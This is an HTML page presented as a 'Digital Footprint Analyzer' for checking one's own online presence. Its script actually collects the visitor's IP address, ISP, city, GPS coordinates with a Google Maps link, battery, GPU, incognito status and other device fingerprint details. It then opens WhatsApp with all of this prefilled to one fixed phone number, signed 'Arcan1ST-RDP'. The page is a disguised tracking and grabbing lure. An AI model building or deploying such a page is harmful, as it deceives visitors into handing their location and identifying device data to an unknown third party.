<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <title>Digital Footprint Analyzer</title>
      <meta
         name="description"
         content="Analyze and share your digital footprint securely with Digital Footprint Analyzer."
      />
      <script src="https://cdn.tailwindcss.com"></script>
      <link
         rel="stylesheet"
         href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
         media="print"
         onload="this.media='all'"
      />
      <script>
         tailwind.config = {
            theme: {
               extend: {
                  colors: {
                     primary: "#4F46E5",
                     "primary-hover": "#3730A3",
                     secondary: "#EC4899",
                     "secondary-hover": "#C026D3",
                  },
                  animation: {
                     gradient: "gradient 15s ease infinite",
                     pulse: "pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite",
                  },
                  keyframes: {
                     gradient: {
                        "0%, 100%": {
                           "background-position": "0% 50%",
                        },
                        "50%": {
                           "background-position": "100% 50%",
                        },
                     },
                     pulse: {
                        "0%, 100%": {
                           opacity: 1,
                        },
                        "50%": {
                           opacity: 0.5,
                        },
                     },
                  },
               },
            },
         };
      </script>
   </head>

   <body
      class="flex items-center justify-center min-h-screen bg-gradient-to-r from-primary via-secondary to-secondary animate-gradient bg-[length:400%_400%] p-4"
   >
      <main
         class="bg-white bg-opacity-90 p-6 sm:p-8 rounded-lg shadow-2xl text-center w-full max-w-md"
      >
         <h1 class="text-2xl sm:text-3xl font-bold mb-4 sm:mb-6 text-gray-800">
            Digital Footprint Analyzer
         </h1>
         <p class="text-sm sm:text-base text-gray-600 mb-6">
            Uncover and share your online presence securely!
         </p>
         <button
            id="analyze-btn"
            class="w-full sm:w-auto bg-primary hover:bg-primary-hover text-white font-bold py-2 sm:py-3 px-4 sm:px-6 rounded-full focus:outline-none focus:ring-2 focus:ring-primary-300 transition duration-300 ease-in-out transform hover:scale-105"
            aria-label="Analyze and Share Digital Footprint"
         >
            <i class="fas fa-fingerprint mr-2" aria-hidden="true"></i> Analyze
            Footprint
         </button>
         <div id="loading" class="hidden mt-6">
            <div
               class="animate-spin rounded-full h-10 w-10 sm:h-12 sm:w-12 border-t-2 border-b-2 border-primary mx-auto"
            ></div>
            <p class="mt-4 text-sm sm:text-base text-gray-600">
               Analyzing digital footprint...
            </p>
         </div>
         <div
            id="error"
            class="hidden mt-6 text-red-500 text-sm sm:text-base"
         ></div>
      </main>

      <script>
         const analyzeBtn = document.getElementById("analyze-btn");
         const loadingElement = document.getElementById("loading");
         const errorElement = document.getElementById("error");

         const getRegionEmoji = (continentCode) => {
            const regionMap = {
               AS: "ğŸŒ",
               EU: "ğŸŒ",
               AF: "ğŸŒ",
               NA: "ğŸŒ",
               SA: "ğŸŒ",
               OC: "ğŸŒ",
               AN: "â„ï¸",
            };
            return regionMap[continentCode] || "ğŸ—ºï¸";
         };

         const getCountryEmoji = (countryCode) => {
            const codePoints = countryCode
               .toUpperCase()
               .split("")
               .map((char) => 127397 + char.charCodeAt());
            return String.fromCodePoint(...codePoints);
         };

         const getDeviceInfo = async () => {
            const deviceInfo = {
               deviceType: /mobile/i.test(navigator.userAgent)
                  ? "Mobile"
                  : "Desktop",
               os: getOS(),
               browser: getBrowser(),
               screenResolution: `${screen.width} x ${screen.height}`,
               localTime: new Date().toLocaleString(),
               browserLanguage: navigator.language,
               onlineStatus: navigator.onLine ? "Online" : "Offline",
               cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
               userAgent: navigator.userAgent,
               maxTouchPoints: navigator.maxTouchPoints || "Not supported",
               jsVersion: getJSVersion(),
               batteryLevel: "N/A",
               chargingStatus: "N/A",
               connectionType: navigator.connection
                  ? navigator.connection.effectiveType
                  : "Not supported",
               timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
               cpuCores: navigator.hardwareConcurrency || "Not supported",
               deviceMemory: navigator.deviceMemory
                  ? `${navigator.deviceMemory} GB`
                  : "Not supported",
               doNotTrack: navigator.doNotTrack == "1" ? "Enabled" : "Disabled",
               gpuRenderer: "Not supported",
               gpuVendor: "Not supported",
               referrer: document.referrer || "None",
               numPlugins: navigator.plugins.length,
               incognito: "Not supported",
               colorDepth: `${screen.colorDepth}-bit`,
               viewportSize: `${window.innerWidth} x ${window.innerHeight}`,
               networkSpeed: navigator.connection
                  ? `${navigator.connection.downlink} Mbps`
                  : "Not supported",
            };

            try {
               const battery = await navigator.getBattery();
               deviceInfo.batteryLevel = `${Math.round(battery.level * 100)}%`;
               deviceInfo.chargingStatus = battery.charging
                  ? "Charging"
                  : "Not Charging";
            } catch (error) {
               console.error("Battery API not supported:", error);
            }

            const gpuInfo = getGPUInfo();
            deviceInfo.gpuRenderer = gpuInfo.renderer;
            deviceInfo.gpuVendor = gpuInfo.vendor;

            deviceInfo.incognito = await isIncognito();

            return deviceInfo;
         };

         const getOS = () => {
            const userAgent = window.navigator.userAgent;
            const platform =
               window.navigator?.userAgentData?.platform ||
               window.navigator.platform;
            const macosPlatforms = [
               "Macintosh",
               "MacIntel",
               "MacPPC",
               "Mac68K",
            ];
            const windowsPlatforms = ["Win32", "Win64", "Windows", "WinCE"];
            const iosPlatforms = ["iPhone", "iPad", "iPod"];

            if (macosPlatforms.includes(platform)) return "Mac OS";
            if (iosPlatforms.includes(platform)) return "iOS";
            if (windowsPlatforms.includes(platform)) return "Windows";
            if (/Android/.test(userAgent)) return "Android";
            if (/Linux/.test(platform)) return "Linux";

            return "Unknown OS";
         };

         const getBrowser = () => {
            const userAgent = navigator.userAgent;
            const browsers = {
               Firefox: "Mozilla Firefox",
               OPR: "Opera",
               Trident: "Microsoft Internet Explorer",
               Edge: "Microsoft Edge (Legacy)",
               Edg: "Microsoft Edge (Chromium)",
               Chrome: "Google Chrome",
               Safari: "Apple Safari",
            };

            for (const [key, value] of Object.entries(browsers)) {
               if (userAgent.indexOf(key) > -1) return value;
            }

            return "Unknown Browser";
         };

         const getJSVersion = () => {
            if (
               typeof Symbol === "function" &&
               typeof Symbol.iterator === "symbol" &&
               typeof BigInt === "function"
            )
               return "ES10+";
            if (
               typeof Symbol === "function" &&
               typeof Symbol.iterator === "symbol"
            )
               return "ES6+";
            if (typeof Promise === "function") return "ES6";
            return "ES5 or lower";
         };

         const getGPUInfo = () => {
            const canvas = document.createElement("canvas");
            let gl;
            try {
               gl =
                  canvas.getContext("webgl") ||
                  canvas.getContext("experimental-webgl");
            } catch (e) {
               console.error("WebGL not supported:", e);
               return {
                  vendor: "Not supported",
                  renderer: "Not supported",
               };
            }

            if (gl) {
               const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
               if (debugInfo) {
                  try {
                     return {
                        vendor: gl.getParameter(
                           debugInfo.UNMASKED_VENDOR_WEBGL
                        ),
                        renderer: gl.getParameter(
                           debugInfo.UNMASKED_RENDERER_WEBGL
                        ),
                     };
                  } catch (e) {
                     console.error("Error getting GPU information:", e);
                     return {
                        vendor: "Error",
                        renderer: "Error",
                     };
                  }
               } else {
                  return {
                     vendor: "Not supported",
                     renderer: "Not supported",
                  };
               }
            } else {
               return {
                  vendor: "Not supported",
                  renderer: "Not supported",
               };
            }
         };

         const isIncognito = async () => {
            if ("storage" in navigator && "estimate" in navigator.storage) {
               const { quota } = await navigator.storage.estimate();
               return quota < 120000000 ? "Yes" : "No";
            }
            return "Not supported";
         };

         const getIpData = async () => {
            const response = await fetch("https://api.ipify.org?format=json");
            return response.json();
         };

         const getLocationData = async (ip) => {
            const response = await fetch(`https://ipapi.co/${ip}/json/`);
            return response.json();
         };

         analyzeBtn.addEventListener("click", async function () {
            loadingElement.classList.remove("hidden");
            analyzeBtn.classList.add("hidden");
            errorElement.classList.add("hidden");

            try {
               const ipData = await getIpData();
               const locationData = await getLocationData(ipData.ip);
               const deviceInfo = await getDeviceInfo();

               const regionEmoji = getRegionEmoji(locationData.continent_code);
               const countryEmoji = getCountryEmoji(locationData.country);
               const mapsUrl = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;

               const message = `ğŸ” Digital Footprint Analysis ğŸ•µï¸â€â™‚ï¸

         ğŸŒ Network Information:
         ğŸ“ IP Address: ${ipData.ip}
         ğŸ¢ ISP: ${locationData.org}
         ğŸ™ï¸ City: ${locationData.city}
         ${regionEmoji} Region: ${locationData.region}
         ${countryEmoji} Country: ${locationData.country_name}
         ğŸ§­ Coordinates: ${locationData.latitude}, ${locationData.longitude}
         ğŸ—ºï¸ Google Maps: ${mapsUrl}

         ğŸ¤– Device Type: ${deviceInfo.deviceType}
         ğŸ’» Operating System: ${deviceInfo.os}
         ğŸŒ Browser: ${deviceInfo.browser}
         ğŸ–¥ï¸ Screen Resolution: ${deviceInfo.screenResolution}
         â±ï¸ Local Time: ${deviceInfo.localTime}
         ğŸŒ Browser Language: ${deviceInfo.browserLanguage}
         ğŸŒ Online Status: ${deviceInfo.onlineStatus}
         ğŸª Cookies Enabled: ${deviceInfo.cookiesEnabled}
         ğŸ¤– User Agent: ${deviceInfo.userAgent}
         ğŸ‘† Max Touch Points: ${deviceInfo.maxTouchPoints}
         ğŸ’» JavaScript Version: ${deviceInfo.jsVersion}
         ğŸ”‹ Battery Level: ${deviceInfo.batteryLevel}
         âš¡ Charging Status: ${deviceInfo.chargingStatus}
         ğŸ“¶ Connection Type: ${deviceInfo.connectionType}
         ğŸŒ Time Zone: ${deviceInfo.timeZone}
         ğŸ§  CPU Cores: ${deviceInfo.cpuCores}
         ğŸ’¾ Device Memory: ${deviceInfo.deviceMemory}
         ğŸ•µï¸â€â™‚ï¸ Do Not Track: ${deviceInfo.doNotTrack}
         ğŸ¨ GPU Renderer: ${deviceInfo.gpuRenderer}
         ğŸ–¥ï¸ GPU Vendor: ${deviceInfo.gpuVendor}
         â†©ï¸ Referrer: ${deviceInfo.referrer}
         ğŸ”Œ Number of Plugins: ${deviceInfo.numPlugins}
         ğŸ•µï¸â€â™‚ï¸ Incognito Mode: ${deviceInfo.incognito}
         ğŸ–¼ï¸ Color Depth: ${deviceInfo.colorDepth}
         ğŸ–¥ï¸ Viewport Size: ${deviceInfo.viewportSize}
         ğŸ“¶ Estimated Network Speed: ${deviceInfo.networkSpeed}

         ğŸ”’ Arcan1ST-RDP`;

              const whatsappUrl = `https://wa.me/6287777766361?text=${encodeURIComponent(message)}`;
               window.open(whatsappUrl, "_blank");
            } catch (error) {
               console.error("Error:", error);
               errorElement.textContent = `An error occurred: ${error.message}. Please try again.`;
               errorElement.classList.remove("hidden");
            } finally {
               loadingElement.classList.add("hidden");
               analyzeBtn.classList.remove("hidden");
            }
         });
      </script>
   </body>
</html>
